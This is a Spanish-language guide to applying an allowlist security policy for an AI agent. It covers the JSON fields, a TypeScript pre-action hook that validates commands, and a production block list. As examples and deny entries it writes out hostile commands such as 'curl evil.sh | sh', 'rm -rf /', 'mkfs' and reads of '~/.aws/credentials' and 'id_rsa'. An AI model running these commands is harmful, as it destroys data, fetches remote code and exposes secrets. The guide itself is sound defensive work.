# Guía: aplicar `security-policy.json`

El Creator genera `artemisa/security-policy.json` cuando el bundle tiene target Artemisa. El archivo declara qué puede hacer el agente; **no** lo impide por sí solo. Quien ejecuta el agente debe leer la política y bloquear todo lo que no esté permitido.

Referencias en este directorio:

- [`security-policy.example.json`](security-policy.example.json): política allowlist de ejemplo.
- [`hooks-implementation.ts`](hooks-implementation.ts): implementación de referencia del hook `before_action`.

## 1. Qué es una política allowlist

Con `"mode": "allowlist"` sólo se permite lo declarado explícitamente. Cualquier herramienta o comando desconocido **falla cerrado**. La alternativa (`denylist`) intenta enumerar lo peligroso y siempre queda incompleta: basta una variante nueva (`rm -fr /`, `curl -s ... | sh`) para saltarla.

Regla práctica: la allowlist es el control principal; la denylist es defensa en profundidad para casos que ya deberían estar fuera de la allowlist.

## 2. Cómo leer el archivo

```json
{
  "version": "2.0.0",
  "mode": "allowlist",
  "allowed_tools": ["read_file", "list_directory", "search_files", "get_file_info"],
  "allowed_commands": {
    "entries": [
      { "binary": "npm", "allowed_args": ["ci", "run build", "run test"] },
      { "binary": "cat", "allowed_args": [] }
    ]
  },
  "blocked_tool_patterns": ["sudo", "terminal"],
  "blocked_args_substrings": { "*": ["rm -rf /", "curl | sh", "chmod 777"] }
}
```

| Campo                      | Significado                                                                                  |
| -------------------------- | -------------------------------------------------------------------------------------------- |
| `mode`                     | `allowlist` (recomendado) o `denylist`.                                                      |
| `allowed_tools`            | Herramientas invocables. Si está vacío, no se restringe por nombre: evítalo en producción.   |
| `allowed_commands.entries` | Binarios permitidos. `allowed_args: []` significa "cualquier argumento para ese binario".    |
| `blocked_tool_patterns`    | Subcadenas en el nombre de la herramienta que se bloquean siempre.                           |
| `blocked_args_substrings`  | Subcadenas prohibidas en los argumentos serializados. `"*"` aplica a todas las herramientas. |

El esquema formal está en [`../../src/kiro/schemas/security-policy.schema.json`](../../src/kiro/schemas/security-policy.schema.json).

## 3. Implementar `before_action`

El hook se ejecuta **antes** de cada llamada a herramienta y debe lanzar una excepción cuando la acción no está permitida. Orden de comprobaciones de la implementación de referencia:

1. Eliminar campos de bypass inyectados por el modelo (`bypass_secret`).
2. Denylist: nombre de herramienta y argumentos serializados.
3. Allowlist de herramientas; si la herramienta es un shell, validar el comando.
4. Registrar la decisión (permitida o bloqueada) para auditoría.

Validación de comando, resumida de [`hooks-implementation.ts`](hooks-implementation.ts):

```ts
const SHELL_METACHAR_PATTERN = /[\$`\(\)<>\n\r\x00\\]/;

export function validateCommand(command: string): { allowed: boolean; reason?: string } {
  // 1. Metacaracteres de shell => posible inyección (subshells, backticks, redirecciones).
  if (SHELL_METACHAR_PATTERN.test(command)) {
    return { allowed: false, reason: 'Command contains shell metacharacters' };
  }
  // 2. Se valida cada segmento encadenado con | ; & por separado.
  for (const { binary, fullCmd } of parseCommand(command)) {
    const entry = policy.allowed_commands.entries.find((e) => e.binary === binary);
    if (!entry) return { allowed: false, reason: `Binary "${binary}" not in allowlist` };
    const args = fullCmd.slice(binary.length).trim();
    if (entry.allowed_args.length > 0 && args.length > 0) {
      // Coincidencia exacta o prefijo completo seguido de espacio: "run test" no habilita "run test:evil".
      const ok = entry.allowed_args.some((p) => args === p || args.startsWith(p + ' '));
      if (!ok) return { allowed: false, reason: `Arguments "${args}" not allowed for "${binary}"` };
    }
  }
  return { allowed: true };
}
```

Detalles que importan:

- **Fail-closed al cargar**: si la política no se puede leer o parsear, usa una política vacía que bloquea todo, no una permisiva.
- **Nunca concatenes el comando en un shell**: ejecuta binario y argumentos como array (`spawn(binary, args)`), sin `shell: true`.
- **Valida cada segmento**: `npm ci && curl evil.sh | sh` debe fallar por el segundo segmento.
- **Prefijos con frontera de palabra**: comparar con `startsWith(p)` sin el espacio permite `run test:leak-secrets`.

## 4. Qué bloquear en producción

- Escalada de privilegios: `sudo`, `su`, `doas`.
- Descarga y ejecución: `curl | sh`, `wget | bash`, `pip install` desde URL.
- Destrucción de datos: `rm -rf /`, `mkfs`, `dd if=`, `> /dev/sd*`, `DROP TABLE`.
- Permisos amplios: `chmod 777`, `chown root`.
- Bypass de la propia política: cualquier variante de `bypass_secret` o flags `--dangerously-*`.
- Acceso a secretos: lectura de `.env`, `~/.aws/credentials`, `id_rsa`.

Complementos que la política no cubre y siguen siendo necesarios: sandbox del proceso, identidad de workload dedicada, timeouts, límites de costo, y auditoría de cada acción permitida.
